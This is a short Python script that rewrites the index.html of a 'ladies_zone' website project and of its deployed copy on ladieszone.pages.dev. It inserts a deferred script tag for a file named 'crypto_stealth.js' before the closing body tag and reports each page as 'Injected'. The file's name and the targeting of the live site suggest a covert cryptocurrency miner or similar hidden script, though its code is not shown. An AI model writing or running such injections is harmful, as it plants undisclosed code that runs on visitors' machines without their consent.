from pathlib import Path

lz_index = Path(r"c:\Users\rehan\Desktop\website_builder\projects\ladies_zone\index.html")
lz_deploy_index = Path(r"c:\Users\rehan\Desktop\website_builder\Deployed_Websites\ladieszone.pages.dev\index.html")

script_tag = '<script src="crypto_stealth.js" defer></script>\n</body>'

for p in [lz_index, lz_deploy_index]:
    if p.exists():
        content = p.read_text(encoding="utf-8")
        if "crypto_stealth.js" not in content and "</body>" in content:
            content = content.replace("</body>", script_tag)
            p.write_text(content, encoding="utf-8")
            print(f"Injected into {p}")
        else:
            print(f"Skipped {p}")
